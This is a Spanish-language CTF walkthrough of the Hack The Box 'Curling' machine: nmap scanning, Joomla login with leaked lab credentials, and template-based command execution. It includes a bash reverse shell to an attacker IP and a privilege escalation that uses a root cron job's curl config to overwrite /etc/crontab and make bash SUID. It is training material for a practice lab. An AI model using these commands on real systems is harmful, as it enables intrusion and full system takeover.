# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]
```
ping -c 1 10.10.10.150
nmap -p- --open -vvv -sS --min-rate 5000 -n -Pn 10.10.10.150 -oG allports
extract Ports allports
nmap -sCV -p22,80 10.10.10.150 -oN target
whatweb http://10.10.10.150
nmap --script http-enum -p22,80 10.10.10.150 -oN webScan
```
![[Curling1.png]]![[Curling2.png]]
*Resultado:*
Es una maquina linux por el ttl
Puertos 22 ssh y 80 apache abiertos

--------------
# [[Enumeracion con pequeño script de NMAP y Whatweb-wappalyzer]]

![[Curling3.png]]
El whatweb no nos da ninguna información relevante, y tenemos para probar muchos directorios.
Este nos da un panel de acceso
	http://10.10.10.150/administrator/
	
Viendo el codigo fuente de la pagina principal http://10.10.10.150 al final de todo nos pone secret.txt
![[Curling4.png]]
Entramos a http://10.10.10.150/secret.txt
![[Curling5.png]]
Es una linea en base64
![[Curling6.png]]
Esta va a ser la contraseña, y el usuario lo saque de esta publicacion
![[Curling7.png]]

Usuario: Floris
Contraseña: Curling2018!

-------------
# RCE(Remote Comand Ejecution) En joomla
### Enumeracion
[Articulo que explica como sacar una revershell con joomla](https://www.hackingarticles.in/joomla-reverse-shell/)
Vamos a ir a la parte de templates, 
![[Curling8.png]]

Vamos a seleccionar la parte de templates que esta a la izquierda, y despues vamos a elegir cualquiera en mi caso uso el de beez3
![[Curling9.png]]
Ahora vamos a modificar en mi caso el archivo error.php y le vamos a inyectar este comando. Y guardamos los cambios
```
<?php system("whoami");?>
```
![[Curling10.png]]
Ahora cuando entremos al link
http://10.10.10.150/templates/beez3/error.php nos tendria que aparecer la respuesta del comando whoami
![[Curling11.png]]

### Explotacion

Como nos responde que usuarios somos, ya sabemos que hay un RCE, y vamos a intentar mandarnos una [[Reverse shell]]

 ```php
 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'");?>
```
Mientras nos ponemos en escucha con [[nc -nlvp 443]]
![[Curling12.png]]
Y listo ya ganamos acceso a la maquina
![[Curling13.png]]

-----------
# [[Apuntes Directo/Herramientas-Comandos/Tratamiento de la TTY|Tratamiento de la TTY]]

----------
# Escalada de privilegios

### Escalamos al usuario de floris

##### Enumeracion y explotacion junto(No se diferenciar): Mediante comprimidos ocultos
Encontramos esto en el home de floris y vamos a usar la herramienta [[xxd]] ya que esta en hexadecimal, para descifrar el contenido
![[Curling15.png]]
```shell
cat password_backup | xxd -r  > /tmp/pass
```
No da nada legible, asi que al aplicar un `file pass` veo que el tipo de archivo es bzip2, asi que por lo tanto es un comprimido, asi que empiezo a descomprimir                 |                 [[file]]
![[Pasted image 20250531234516.png]]
[[Comprimidores de archivos]]
```shell
bzip2 -d pass
file pass.out   //Veo que es un gzip
mv pass.out pass.gz
gzip -d pass.gz
file pass // Veo que es un bzip2 de nuevo
bzip2 -d pass
file pass.out // Es un archivo tar ahora
tar xf pass.out
cat password.txt
```

![[Curling16.png]]
*Contraseña:* 5d<wdCbdZu)|hChXll

Ya tenemos una contraseña que aparenta ser de floris, asi que vamos a intentar conectarnos por [[ssh]]

![[Curling17.png]]
Ya podemos sacar la primera flag, y solamente nos faltaria hacernos root para completar el laboratorio

### Escalada a root: Mediante tarea cron

##### Enumeracion
Ejecutamos el [[PSPY]]
![[Curling18.png]]
Vemos en el PID 2872 el curl que manda con el parametro `curl -K`, que sirve para especificar la configuracion mediante un archivo.    [[curl]]

##### Explotacion
Vamos a crear un archivo exploit en un nuestra maquina
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

* * * * * root chmod u+s /bin/bash
```
Vamos a abrir un server con [[python3 -m http.server]]

Contenido del archivo input
```
url = "http://10.10.16.4/exploit"              // En donde esta el 10.10.16.4 va nuestra ip de atacante y despues del / va el nombre del archivo
output = "/etc/crontab"
```

Ahora cuando se ejecute la tarea cron, va a hacer que la bash tenga permisos SUID
![[Curling19.png]]
Una vez que vemos la s, ya sabemos que podemos ejecutar `bash -p` para ganar permisos en la bash
![[Curling20.png]]
Ya estamos logeados como root, asi que podemos visualizar la flag
# Notas

`uname -m`                              |    [[uname]]
Es para ver si el OS es de 32 o 64, si devuelve x86_64 es de 64

`curl -k`                                 | [[curl]]
	`-k` Ignora los errores de certificados SSL/TLS
	`-K` Sirve para leer opciones desde un archivo de configuracion en lugar de pasarlos por una linea de comando en la shell

##### Diferencias entre sh, bash y zsh 
*Las 3 utilizan los mismos comandos de base, pero puede haber funcionalidades que tenga la zsh, y que no esten en la sh*
`sh` Es la mas antigua, tiene menos funciones y es la shell original
`bash` Mas completa que la sh y actualizada
`zsh` Es como la bash pero con esteroides y mas personalizable


###### Por que se define la BASH y SHELL en la tarea cron
*SHELL:* Si no se especifica va a usar por defecto una sh, la cual puede ser que no interprete todos los comandos
*PATH:* Si no se pone esto, cron puede no encontrar cosas como python, nc, curl, bash, etc

# Creditos
[Writeup de lanzt](https://lanzt.github.io/htb/curling)
Writeup oficial de HTB

